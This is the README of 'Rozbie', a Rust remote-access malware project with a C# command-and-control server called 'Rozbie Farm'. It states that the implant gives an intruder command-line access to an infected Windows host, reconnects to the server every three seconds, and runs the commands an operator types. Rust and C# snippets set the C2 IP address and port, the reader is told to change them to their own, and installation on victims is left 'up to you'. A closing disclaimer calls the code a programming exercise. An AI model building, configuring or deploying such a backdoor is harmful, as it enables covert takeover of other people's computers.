# Rozbie

Version: 0.1.0

This is a simple and very standard malware code that provide an access to the infected host.
The Rozbie works only on Windows OS.

## Project

The presented soluction consists of two project:

1. Rozbie malware written in Rust. It is a program that must to be run in the target system to give an intruder an access to system's command line.
2. Rozbie Farm is a server in which you can execute commands to run on remote, infected with Rozbie computers.

![Rozbie Farm](https://github.com/rozensoftware/rozbie/blob/master/RozbieFarm.png)

## Installation

It is up to you how you install Rozbie on target computer.
When it is there it will try to connect Rozbie Farm application once per 3 seconds. You can type DOS command to be executed on the infected computer.

You must change the *IP* address and eventually the port to yours in the main.rs:

```rust
const SERVER_IP: &'static str = "192.168.0.22";
const SERVER_PORT: &'static str = "1973";
```

The same must be changed on the C# side in Server.cs file:

```csharp
private static readonly int SERVER_PORT = 1973;
private static readonly string SERVER_IP = "192.168.0.22";
```

## Disclamer

The author of this code is not responsible for the incorrect operation of the presented code and/or for its incorrect use. The code presented in this project is intended to serve only to learn programming.

## License

This project is licensed under MIT

MIT license (LICENSE-MIT or <http://opensource.org/licenses/MIT>)

## Contributing / Feedback

I am always glad to learn from anyone.
If you want to contribute, you are more than welcome to be a part of the project! Try to share you thoughts first! Feel free to open a new issue if you want to discuss new ideas.

Any kind of feedback is welcome!
